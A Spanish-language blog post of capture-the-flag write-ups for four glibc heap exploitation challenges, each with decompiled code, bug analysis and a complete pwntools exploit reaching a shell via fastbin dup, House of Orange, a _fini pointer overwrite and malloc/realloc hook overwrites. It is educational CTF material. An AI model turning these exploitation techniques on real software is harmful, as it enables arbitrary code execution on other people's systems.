---
layout: single
classes: wide
title: "Q4CTF 2020 Heap Writeups"
header:
  teaser: /assets/images/content/q42020/motoko.jpg
excerpt: "Soluciones a los problemas de heap del CTF de Q4 del 2020: Wallet, Mision, Motoko, 420."
---

Soluciones a los problemas de heap del CTF de Q4 del 2020.

1. [Wallet](/2020/10/05/Q4CTF-Heap-Writeups.html#wallet)
2. [Mision](/2020/10/05/Q4CTF-Heap-Writeups.html#mision)
2. [Motoko](/2020/10/05/Q4CTF-Heap-Writeups.html#motoko)
3. [420](/2020/10/05/Q4CTF-Heap-Writeups.html#420)

# Wallet

Wallet no era un reto de heap tradicional, pero lo inclui en esta categoria de writeup ya que de todas formas tenia que ver con algunos temas de heap. 

Pueden descargar el binario [aqui](/content/q42020/wallet/wallet).

Si reverseamos el binario de wallet con Ghidra, nos podemos dar cuenta de que en la funcion check, si la wallet que estamos checkeando tiene un valor de mas de `0x79797979`, llama a `system("/bin/sh")`. Podemos crear wallets con 0x100 de valor y transferir valores entre ellas, pero tenemos un limite de creaciones que hace imposible alcanzar el valor que necesitamos solo con las funciones del binario.

Pero la funcion `sendwalocoins()` tiene un bug de logica:

```c
  if ((walletcount < cVar1) || (walletcount < cVar2)) {
    puts("INVALID WALLET ID");
  }
```

Si examinamos el `if` que checkea que ambas wallets que participan en la transferencia, nos damos cuenta de que referencia a las variables `cVar1` como el primer numero que ingresamos y a `cVar2` como el segundo. Si volvemos un poco atras en la funcion, a la inicializacion de estas variables, vemos:

```c
  printf("FROM >");
  cVar1 = getint();
  printf("TO >");
  cVar2 = getint();
```

Obtiene los numeros de las wallets con una funcion llamada `getint()`. Podemos ver que hace esta funcion:

```c
void getint(void)

{
  long in_FS_OFFSET;
  char *local_20;
  size_t local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_20 = (char *)0x0;
  local_18 = 0;
  getline(&local_20,&local_18,stdin);
  atoi(local_20);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Vemos que hace una llamada a `getline()` y luego convierte el input a un integer usando `atoi()`. El bug esta en el uso de `atoi()`. Si volvemos a la funcion `sendwalocoins()` podemos ver que solo checkea que los numeros de las wallets no sean mayores a la cantidad de wallets que hemos creado, esto para evitar que hagamos transferencias desde direcciones que no pertenecen a una wallet real.

Pero no checkean que los numeros que hayamos introducido no sean MENORES a 0. Debido a que la funcion `atoi()` devuelve un integer, y no un unsigned integer o un unsigned long, podemos introducir un numero que sera interpretado como un valor negativo. En low level, si no se especifica que un numero es "unsigned", este numero puede tomar un valor negativo. Los valores que son interpretados como negativos por el procesador son los `valor > 0x7fffffffffffffff && valor < 0x10000000000000000`, y los interpretados como positivos son los `valor > 0x00 && valor < 0x8000000000000000`.

Con esto, apuntaremos a una wallet falsa que se encuentre mas abajo en el heap, y transferiremos facilmente un valor mayor a `0x79797979` para luego spawnear una shell. Pero, a donde debemos apuntar esta wallet falsa? Simple. Usando la funcion `signmessage()`, podemos alloquear y freear un chunk. Este chunk ira a una lista llamda `tcachebin`, cuyo head pointer se encuentra en un struct llamado `tcache_perthread_struct`. Este struct se encuentra en la base del heap. Entonces, podemos usar este pointer cuyo valor es, gracias al ASLR, mucho mayor a `0x79797979`, para transferir desde esta "wallet falsa" a una wallet real y luego conseguir nuestra shell.

El "exploit" final queda asi (aunque se puede hacer de forma manual perfectamente):

```python
#!/usr/bin/python
from pwn import *

context.log_level = "DEBUG"
elf = ELF("./wallet")
libc = ELF("./libc.so.6")
#p = gdb.debug(elf.path, "c")
#p = remote("10.150.0.4", 9995)
p = process(elf.path)

def check(ind):
    p.sendlineafter("> ", "1")
    p.sendlineafter("> ", str(ind))

def send(fromm, to, amount):
    p.sendlineafter("> ", "2")
    p.sendlineafter(">", str(fromm))
    p.sendlineafter(">", str(to))
    p.sendlineafter(">", str(amount))

def create():
    p.sendline("3")

def sign(message):
    p.sendlineafter("> ", "4")
    p.sendlineafter("> ", message)

create()
sign("asd")

send(0xffffff9a, 0, 0x79797979)
check(0)

p.interactive()
```

Un desafio muy interesante, que al menos para mi fue una buena introduccion a los bugs de logica.


# Mision

Motoko es un reto de heap con libc 2.30 compilada sin tcache. Nos entregan como material el [binario](/content/q42020/mision/bin), el [ld](/content/q42020/mision/ld.so) y la [libc](/content/q42020/mision/libc.so.6). El binario tiene NX y Canary habilitadas, pero solo Partial RELRO y tampoco hay PIE:

```
$ checksec bin
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  '.'
```

Si corremos el binario nos podemos dar cuenta de que nos da una direccion de libc para empezar. Podemos ver tambien que tenemos tres opciones: Agregar destino, eliminar destino y salir.

Vamos a saltarnos el reversing estatico para este desafio ya que el binario es bastante simple. Con un poco de analisis dinamico a traves de un debugger podemos hacernos una buena idea de como funciona todo. Con esto, podemos identificar que el bug es un UAF: podemos eliminar un destino mas de una vez (siempre y cuendo bypasseemos la double free check de los fastbins).

Si agregamos dos destinos, liberamos el primero, luego el segundo y luego el primero de nuevo no tendremos problemas con las checks. Podemos usar eso para hacer un fastbin dup.

Podemos intentar conseguir un chunk en la GOT para sobreescribir algo desde ahi, ya que solo tenemos partial Relro. Creo que esta era la solucion intended, pero yo no pude conseguir ningun size field apropiado en la GOT para poder hacer un fastbin dup hacia alla, por lo que opte por otra solucion.

Si usamos el comando `vmmap` en gdb, podemos ver las direcciones de memoria en las que esta mappeada cada seccion. Para este desafio nos es particularmente interesante la seccion ubicada justo arriba de la GOT. Esta seccion se llama `.dynamic`, y como podemos ver con `vmmap`, tenemos permisos de read y write hacia ella. En dynamic podemos encontrar un pointer a una seccion del codigo llamada `_fini`: el codigo en esta seccion se ejecuta siempre que el programa hace `exit`. Si conseguimos un chunk en `.dynamic` y sobreescribimos la direccion de `_fini` con la de un [one_gadget](https://github.com/david942j/one_gadget), obtendremos una shell. Justo antes del pointer a `_fini` esta el pointer a `_init`, por lo que podemos usar el Most-Significant-Byte de ese pointer como size field para nuestro chunk.

El exploit final queda asi:

```python
#!/usr/bin/python
from pwn import *

context.log_level = "DEBUG"
elf = ELF("./bin")
libc = ELF("./libc.so.6")
#p = gdb.debug(elf.path, "c")
p = remote("10.150.0.4", 9989)

def alloc(size=0x30, data=""):
    p.sendlineafter("> ", "1")
    p.sendlineafter("Distancia: ", str(size))
    if data != "":
        p.sendafter("Direccion:", data)
    else:
        p.sendlineafter("Direccion", data)

def free(ind):
    p.sendlineafter("> ", "2")
    p.sendlineafter("Identificador", str(ind))

p.recvuntil("id : ")
leak = int(p.recvline(), 16)
libc.address = leak - 0x6faf0
log.info(hex(leak))
log.info(hex(libc.address))

alloc()
alloc()
free(0)
free(1)
free(0) # Fastbin dup

alloc(0x30, p64(0x802012)) # Address en .dynamic
alloc() 
alloc()
alloc(0x30, "ASDFAS" + p64(libc.address + 0xc4dbf)) # Sobreescribimos el pointer a _fini con un pointer a nuestro one_gadget

p.sendlineafter("> ", "3") # Llamamos a la funcion exit

p.interactive() # Tenemos una shell!
```  

Mision fue un desafio muy divertido para calentar para los heaps de despues :D


# Motoko

Motoko es un reto de heap con libc 2.23. Nos entregan como material el [binario](/content/q42020/motoko/motoko), el [ld](/content/q42020/motoko/ld.so) y la [libc](/content/q42020/motoko/libc.so.6). El binario tiene todas las protecciones habilitadas:

```
$ checksec motoko
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

No explicare mucho de las basicas de explotacion de heap en este writeup. Si no te sientes comodo aun con muchos de los conceptos que uso en el writeup, o si quieres aprender mas de explotacion de heap, te recomiendo [este](https://github.com/shellphish/how2heap/) repo.

No hace falta traducir el texto del binario, ya que simplemente podemos reversearlo para enterarnos de lo que hace. Casi todo pasa en la funcion main. Aqui dejo la decompilacion de Ghidra:

```c
void main(void)

{
  undefined8 uVar1;
  void *pvVar2;
  ulong uVar3;
  long in_FS_OFFSET;
  uint local_bc;
  long local_b8;
  void **local_b0;
  void *local_98 [17];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);,
  puts("\n#### ==== ==== ==== ####\n");
  puts(" 私のオレンジ色の友達を歓迎します\n(System Ready, logged as Motoko )  ");
  puts("#### ==== ==== ==== ####\n");
  local_b8 = 0x10;
  local_b0 = local_98;
  while (local_b8 != 0) {
    local_b8 = local_b8 + -1;
    *local_b0 = (void *)0x0;
    local_b0 = local_b0 + 1;
  }
  local_bc = 0;
  do {
    printf("\n1- メッセージを追加 %u/%u\n",(ulong)local_bc,0x10);
    puts("2- 削除する");
    puts("3- 編集する");
    puts("4- 読んだ");
    puts("5- 出口");
    printf("> ");
    uVar1 = read_num();
    switch(uVar1) {
    case 1:
      if (local_bc < 0x10) {
        pvVar2 = calloc(1,0x58);
        local_98[local_bc] = pvVar2;
        if (local_98[local_bc] == (void *)0x0) {
          puts("request failed");
        }
        else {
          local_bc = local_bc + 1;
        }
      }
      else {
        puts("maximum number of chunks reached");
      }
      break;
    case 2:
      printf("index: ");
      uVar3 = read_num();
      if (uVar3 < local_bc) {
        if (local_98[uVar3] == (void *)0x0) {
          puts("this chunk was already freed");
        }
        else {
          free(local_98[uVar3]);
          local_98[uVar3] = (void *)0x0;
        }
      }
      else {
        puts("invalid index");
      }
      break;
    case 3:
      printf("index: ");
      uVar3 = read_num();
      if (uVar3 < local_bc) {
        if (local_98[uVar3] == (void *)0x0) {
          puts("cannot edit a free chunk");
        }
        else {
          printf("data: ");
          read(0,local_98[uVar3],0x59);
        }
      }
      else {
        puts("invalid index");
      }
      break;
    case 4:
      printf("index: ");
      uVar3 = read_num();
      if (uVar3 < local_bc) {
        if (local_98[uVar3] == (void *)0x0) {
          puts("cannot read from a free chunk");
        }
        else {
          write(1,local_98[uVar3],0x58);
        }
      }
      else {
        puts("invalid index");
      }
      break;
    case 5:
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
  } while( true );
}
```

Un resumen de lo que hace cada input:
1. Alloquea un chunk con `calloc(1, 0x58)`, siempre del mismo size, y guarda el pointer en un array en el stack.
2. Libera el chunk del index del array que le digamos con `free(ptr)`. Luego el ptr se elimina, por lo que no hay UAF.
3. Nos deja editar (introducir data) en un chunk a eleccion. Aqui esta el bug: read lee 0x59 bytes, cuando nuestro chunk solo es de 0x58. Tenemos un off-by-one.
4. Hace `puts(ptr)` con ptr siendo un ptr a un chunk que le digamos. Podremos usar esta funcion para conseguir los leaks necesarios.
5. Exit.

Solo podemos alloquear chunks de size 0x58, por lo que un clasico fastbin dup sobre `__malloc_hook` esta eliminado de las posibilidades.

Personalmente me demore un poco en identificar el vector de ataque para este desafio, pero si hubiera traducido el texto del binaro lo habria podido hacer de inmediato XD. Si traducimos la primera frase del japones, obtenemos "Bienvenidos mis amigos naranjas". Esta es una hint dejada por el creador dplastico para que sea mas facil identificar el vector de ataque. Pero, como ayuda esta hint a encontrarlo? Simplemente hay que conocer una tecnica de explotacion de heap de antemano. Esta tecnica se llama House of Orange (de ahi el "naranjo" de la hint).

No me adentrare mucho en la explicacion de House of Orange ya que es bastante compleja, pero si quieres entender mejor como funciona te recomiendo leer [esto](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_orange.c).

En resumidas cuentas, House of Orange es una tecnica de File-Stream Oriented Programming (FSOP) usada en la explotacion de heap en versiones de libc hasta la 2.25 (en la 2.26 se mitiga el ataque). Consiste en sobreescribir el `_IO_list_all` pointer en libc para que apunte a una FILE structure falsa que podemos construir nosotros en el heap. Esta FILE structure falsa tendra un `vtable pointer` que apunte a `system@libc`. Cuando tengamos todo esto listo, provocaremos una llamada a `abort()` con un error en el unsortedbin, lo que flusheara los FILE streams, y cuando se encuentre con nuestro `_IO_list_all` ptr falso, flusheara tambien nuestra FILE structure falsa y saltara al ptr apuntado por nuestra `vtable` - `system`.

Para hacer House of Orange necesitamos leaks tanto de libc como del heap. Para esto podemos usar nuestro off-by-one para sobreescribir el size de un chunk a uno mayor, luego liberar este chunk, haciendo que se vaya a unsortedbin y dejandonos un puntero a libc. Luego podemos alloquear de nuevo, y el ptr a libc se "empujara" a nuestro siguiente chunk alloqueado. Ahora podemos leerlo usando la funcion (4) para conseguir nuestro leak de libc. Luego, podemos seguir un procedimiento similar para obtener chunks superpuestos, y tras liberar uno usar la funcion para mostrar con el otro para obtener un leak de heap. Teniendo estos dos leaks, estamos listos para ejecutar el ataque de HoO.

Como nuestros chunks son siempre de size `0x58`, no cabe toda la FILE structure necesaria para HoO en uno solo. Tendremos que separarla en varios pedazos. En el primer chunk dejaremos un monton de ptrs a `system`, para luego apuntar nuestra `vtable` a este chunk. Luego, podemos construir la misma FILE structure. Debemos hacerla de forma bastante precisa, ya que hay algunos checks que debemos pasar para que se ejecute la funcion de la `vtable`.

Finalmente, el exploit definitivo queda asi:

```python
#!/usr/bin/python
from pwn import *

context.log_level = "DEBUG"
elf = ELF("./motoko")
libc = ELF("./libc.so.6")
#p = gdb.debug(elf.path, "c")
p = process(elf.path)
#p = remote("desafiosq4.duckdns.org", 9998)

def alloc():
    p.sendlineafter("> ", "1")

def free(ind):
    p.sendlineafter(">", "2")
    p.sendlineafter("index: ", str(ind))

def show(ind):
    p.sendlineafter("> ", "4")
    p.sendlineafter("index: ", str(ind))

def edit(ind, data):
    p.sendlineafter("> ", "3")
    p.sendlineafter("index: ", str(ind))
    p.sendafter("data: ", data)

alloc()
alloc()
alloc()
edit(2, p64(0x31)*8)

edit(0, "a"*0x58 + "\x91")

free(1)
alloc()

show(2)
leak = u64(p.recv(8))
libc.address = leak - 0x399b78

edit(3, "a"*0x58 + "\x61")

alloc()

free(0)
free(4)

show(2)
heap = u64(p.recv(8))

alloc()
edit(5, p64(0)*5 + "\x31")

alloc()
edit(6, p64(libc.sym.system)*10)

alloc()
edit(7, p64(0)*5 + "\x31") # fake next chunk size to get unsortedbin

alloc()
edit(8, p64(0) + p64(heap + 0x10)) # vtable pointer to first chunk

edit(3, "a"*0x50 + "/bin/sh\x00" + "\x91") # chunk size overwrite to get unsorted
free(5) # get unosrted
edit(2, p64(leak) + p64(libc.symbols['_IO_list_all'] - 0x10) + p64(2)+p64(3) + p64(0)*7 + "\x00") # set HoO struct

edit(7, p64(0)*11 + "\x00") # null out chunk 8's size right before vtable

edit(3, "a"*0x50 + "/bin/sh\x00" + "\xb1")
alloc()

log.info(hex(heap))
log.info(hex(leak))
log.info(hex(libc.address))
p.interactive()
```

La efectividad de House of Orange depende de un bit que depende del ASLR, por lo que el exploit funciona un 50% de las veces.
Gracias a dplastico por este entretenido desafio :D


# 420

420pwn es un reto de heap con libc 2.30 compilada sin tcache. Nos entregan como material el [binario](/content/q42020/420/test), el [ld](/content/q42020/420/ld-2.30.so) y la [libc](/content/q42020/420/libc.so.6). El binario tiene todas las protecciones habilitadas:

```
checksec test
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  '.'
```

No explicare mucho de las basicas de explotacion de heap en este writeup. Si no te sientes comodo aun con muchos de los conceptos que uso en el writeup, o si quieres aprender mas de explotacion de heap, te recomiendo [este](https://github.com/shellphish/how2heap/) repo.

Comenzamos reverseando el binario. Casi todo pasa en la funcion main. Aqui dejo la decompilacion de Ghidra:

```c
undefined8 main(void)

{
  long lVar1;
  ulong __size;
  void *pvVar2;
  long in_FS_OFFSET;
  uint local_9c;
  long local_98;
  void **local_90;
  void *local_78 [13];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  puts("\n~~~~~~~~~~~~~~~~~~~~~~~~~~");
  puts("Alerta! Motoko ha caido!");
  puts("----------------------------\n");
  printf("esto es lo ultimo que hare por ti! derrota al droide!!! %p\n",puts);
  local_98 = 0xd;
  local_90 = local_78;
  while (local_98 != 0) {
    local_98 = local_98 + -1;
    *local_90 = (void *)0x0;
    local_90 = local_90 + 1;
  }
  local_9c = 0;
  while( true ) {
    while( true ) {
      printf("\n1) guarda %u/%u\n",(ulong)local_9c,0xd);
      puts("2) borra");
      puts("3) chao");
      printf("> ");
      lVar1 = read_num();
      if (lVar1 != 2) break;
      printf("index: ");
      __size = read_num();
      if (__size < local_9c) {
        free(local_78[__size]);
      }
      else {
        puts("invalid index");
      }
    }
    if (lVar1 == 3) break;
    if (lVar1 == 1) {
      if (local_9c < 0xd) {
        printf("size: ");
        __size = read_num();
        if ((__size < 0x59) || ((0x68 < __size && (__size < 0x79)))) {
          pvVar2 = malloc(__size);
          local_78[local_9c] = pvVar2;
          if (local_78[local_9c] == (void *)0x0) {
            puts("request invalido");
          }
          else {
            printf("data: ");
            read(0,local_78[local_9c],__size);
            local_9c = local_9c + 1;
          }
        }
        else {
          puts("solo rapidos... (excluding 0x70)");
        }
      }
      else {
        puts("lo llenaste!");
      }
    }
  }
    if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

Podemos ver que es un binario relativamente simple. Hay algunas cosas que tenemos que destacar de esta funcion:
1. Al iniciarse el binario este nos da la direccion de la funcion puts en libc, por lo que no tenemos que preocuparnos de hacer un leak para bypassear el ASLR.
2. Nos da 3 opciones: (1) alloquear un chunk de size a eleccion y luego introducir data, (2) freear este chunk y (3) salir del programa.
3. Si elegimos la opcion (1) de alloquear, el pointer a nuestro chunk se guarda en un array en el stack.
4. Si elegimos la opcion (2) de freear, se hace free(ptr) con el pointer del index que le digamos del array del stack. Aqui es donde esta el bug: El pointer no es eliminado del array luego de llamar a free! Tenemos un UAF.
5. Lo interesante de este desafio son las limitaciones en el size que podemos alloquear: `if ((__size < 0x59) || ((0x68 < __size && (__size < 0x79)))) {`. Debido a esta regla, no podremos alloquear ningun chunk que termine teniendo size 0x70 a 0x7f, por lo que el clasico ataque de fastbin dup usando misallignment justo antes de `__malloc_hook` no sera posible.
6. Es muy importante notar que, a diferencia de una gran mayoria de desafios de explotacion de heap, el array de chunks se guarda en el STACK, y no en la .bss.

Habiendo identificado el bug podemos pasar a intentar explotarlo.

Teniendo presente un UAF, inmediatamente podemos hacer un fastbin dup. El problema es a donde lo hacemos. Por lo explicado en el punto 5, no podemos usar la mayor parte de los pointers que estan en libc, ya que su Most-Significant-Byte (MSB) es siempre 0x7f debido a la forma en que funciona el ASLR en los binarios de 64-bit.

En el caso de encontrar un MSB menor a 0x70, podriamos usarlo inmediatamente para hacer un fastbin dup hacia esa seccion de libc. El problema que surge  es que, si existe de manera previa uno de estos MSB en la libc, no estan en lugares utiles para nosotros.

Pero que pasaria si en vez de tener que "encontrar" uno de estos MSBs, nosotros "creamos" uno?

En los binarios con PIE y ASLR, el heap SIEMPRE es mappeado en las direcciones `0x55xxxxxxxxxx` o `0x56xxxxxxxxxx`. Nosotros podemos controlar que es lo que pasa en el heap, entonces podemos alloquear un chunk y liberarlo, lo que lo introduciria en la cabeza del fastbin de su size. La direccion de esta cabeza del fastbin es almacenada en la main_arena en libc. Que significa esto? Que acabamos de poner un MSB de 0x55 o 0x56 en la `main_arena` en libc. Ahora podemos hacer un fastbin dup usando este MSB como size field para nuestro chunk. Por la forma en que funciona malloc internamente, un size field de 0x55 provoca una Segmentation Fault, por lo que nuestro exploit se vuelve dependiente del PIE y ASLR para que el heap sea mappeado en 0x56xxxxxxxxxx. Podriamos eliminar esta dependencia haciendo un fastbin dup previo para introducir un address de naturaleza `0x56xxxxxxxxxx` en la head de un fastbin, pero por razones que voy a explicar mas adelante esto hace imposible la utilizacion de una tecnica que tambien explicare mas adelante.

Bueno, tras ejecutar nuestro fastbin dup hacia libc usando el leak que nos proporciona el binario al inicio, obtenemos un chunk en la `main_arena`. Usaremos este chunk para modificar el `ptr` al top chunk que se encuentra tambien en la `main_arena`. Podemos modificarlo para que apunte un poco por debajo de `__malloc_hook` para poder alloquear otro chunk y que este provenga de esa parte de la memoria, permitiendonos sobreescribir `__malloc_hook`.

Siendo esta libc la version 2.30, tenemos que bypassear la [top chunk sanity check](https://sourceware.org/git/?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=9431108626cdc0b5c1972ee00126228c8dd7166f;hp=e247c77b7d4de26e0f2fbec16e352889bac3781b;hb=30a17d8c95fbfb15c52d1115803b63aaa73a285c;hpb=34f86d61687457aa57d40cf3c230ca8404d40e45) introducida en la version 2.29. Debuggeando un poco podemos encontrar un buen size field para nuestro top chunk si cambiamos el pointer a `libc.address + 0x3b4b2c`.

Luego de cambiar la direccion del top chunk, podemos simplemente alloquear un nuevo chunk y sobreescribir `__malloc_hook` con la direccion de un [one_gadget](https://github.com/david942j/one_gadget). Esto deberia bastar para obtener nuestra shell, cierto? PERO NO! HAHAHAHAHA

Aqui es donde el punto numero 6 vuelve a aparecer para jodernos la vida XD. Para que los `one_gadgets` funcionen, sus contraints deben ser cumplidos. En el caso de los problemas de explotacion de heap, el `one_gadget` que casi siempre funciona es el siguiente:

```
0xe1fa1 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL
```

Se necesita que `[rsp+0x50]` sea nulo, pero debido a lo que explique en el punto 6 al inicio del writeup, esta direccion no es nula porque el array de pointers a nuestros chunks se guarda en el stack en vez de la .bss.

Hay alguna forma de hacer que `[rsp+0x50]` ,sea nulo? Si. Luego de completar el desafio, dplastico me comento que la tecnica que yo utilice no era la intended, por lo que definitivamente no es la unica.

Para hacer que `[rsp+0x50]` sea nulo use una tecnica llamada `two-gadget`. Esta consiste en sobreescribir `__malloc_hook` con una direccion cercana a la de `realloc`, y sobreescribir `__realloc_hook` con nuestro `one_gadget`. La clave esta en la direccion con que sobreescribimos `__malloc_hook`. Si nos saltamos los `push` iniciales al comienzo de `realloc`, podemos cambiar la forma en la que esta estructurado el stack al momento de ejecutar nuestro `one_gadget`. Para identificar la direccion correcta con la que reescribir `__malloc_hook` podemos hacer un disassembly a `realloc`:

```
Dump of assembler code for function __GI___libc_realloc:
0x00007ffff7a9fb20 <+0>:     push   r15
0x00007ffff7a9fb22 <+2>:     push   r14
0x00007ffff7a9fb24 <+4>:     push   r13
0x00007ffff7a9fb26 <+6>:     push   r12
0x00007ffff7a9fb28 <+8>:     push   rbp
0x00007ffff7a9fb29 <+9>:     push   rbx
0x00007ffff7a9fb2a <+10>:    sub    rsp,0x18
0x00007ffff7a9fb2e <+14>:    mov    rax,QWORD PTR [rip+0x33049b]        # 0x7ffff7dcffd0
0x00007ffff7a9fb35 <+21>:    mov    rax,QWORD PTR [rax]
0x00007ffff7a9fb38 <+24>:    test   rax,rax
0x00007ffff7a9fb3b <+27>:    jne    0x7ffff7a9fd30 <__GI___libc_realloc+528>
0x00007ffff7a9fb41 <+33>:    test   rsi,rsi
0x00007ffff7a9fb44 <+36>:    mov    r15,rsi
```

Debuggeando un poco, conseguimos que `[rsp+0x50]` sea nulo si apuntamos `__malloc_hook` a `realloc+14`. Esto equivale a apuntarlo a `libc.address + 0x83b2e`.

Tras sobreescribir los hooks de la forma descrita, podemos alloquear un nuevo chunk y nustro `one_gadget` se ejecuta correctamente. Obtenemos la shell :D

A modo de precaucion, para no tener problemas con el top chunk al hacer esta ultima llamada a malloc, deje un chunk libre de size 24 (fastbin) en el heap, por lo que una allocacion de ese size provendra de ahi y no del top chunk.

Aqui les dejo el exploit completo:

```python
#!/usr/bin/python
from pwn import *

context.log_level = "DEBUG"
elf = ELF("./test")
libc = ELF("./libc.so.6")
#p = gdb.debug(elf.path, "c")
p = process(elf.path)
#p = remote("10.150.0.4", 9925)

# Funciones wrapper para el binario
def alloc(size=0x48, data=""):
    p.sendlineafter("> ", "1")
    p.sendlineafter("size: ", str(size))
    if data != "":
        p.sendafter("data: ", data)
    else:
        p.sendlineafter("data: ", data)

def free(ind):
    p.sendlineafter("> ", "2")
    p.sendlineafter("index: ", str(ind))

p.recvuntil("droide!!! ")
leak = int(p.recvline(), 16)
libc.address = leak - libc.sym.puts

alloc(24)
free(0) # Chunk para que la allocacion final no venga del top chunk

alloc(0x78)
free(1) # Introducimos este chunk como cabeza del fastbin de size 0x80 para hacer fastbin dup a main_arena

alloc(0x48)
alloc(0x48)

free(2)
free(3)
free(2) # Fastbin dup

alloc(0x48, p64(libc.address + 0x3b4b9d)) # Address para nuestro chunk en main_arena

alloc(0x48)
alloc(0x48)

alloc(0x48, "AAAABBBB"*2 + "CCC" + p64(libc.address + 0x3b4b2c)) # Sobreexcribimos la direccion del top chunk

alloc(0x58, "AAAABBBBCCCC" + p64(libc.address + 0xe1fa1) + p64(libc.address + 0x83b2e)) # sobreescribimos __realloc_hook y __malloc_hook

p.sendlineafter("> ", "1")
p.sendlineafter("size:", "24") # allocacion final para obtener nuestra shell

log.info(hex(leak))
log.info(hex(libc.address))
p.interactive()
```

El exploit es dependiente del ASLR, por lo que al ejecutarlo un par de veces obtenemos la shell. Como mencione antes, podriamos haber eliminado esta dependencia, pero ello involucraria un par de allocaciones mas para un fastbin dup extra al comienzo del exploit y, si hacia eso, la tecnica del `two-gadget` no era posible porque habria 3 pointers mas en el array del stack y no alcanzariamos a setear `[rsp + 0x50]` a null.

Muchas gracias por el CTF a toda la organizacion de Q4, y en especial a dplastico por los pwns que estuvieron increibles! Hasta aqui con los pwns de heap, si estan interesados hice writeups para el resto de los pwns por separado [aqui](link).
